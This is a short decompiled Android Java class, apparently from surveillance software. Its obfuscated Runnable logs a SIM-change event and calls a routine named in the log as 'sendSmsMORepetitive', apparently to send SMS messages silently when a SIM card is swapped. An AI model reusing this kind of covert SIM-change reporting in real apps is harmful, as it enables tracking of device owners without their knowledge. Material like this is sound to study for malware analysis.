package com.network.android.agent;

import android.content.Context;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.android.c.a.b;

/* access modifiers changed from: package-private */
public final class f implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f64a;
    final /* synthetic */ NetworkApp b;

    f(NetworkApp networkApp, Context context) {
        this.b = networkApp;
        this.f64a = context;
    }

    public final void run() {
        b.a(1, (short) 6);
        a.a("BootReceiver Sim was chaged call sendSmsMORepetitive");
        c.a(this.f64a, 1, 0, 1000);
    }
}
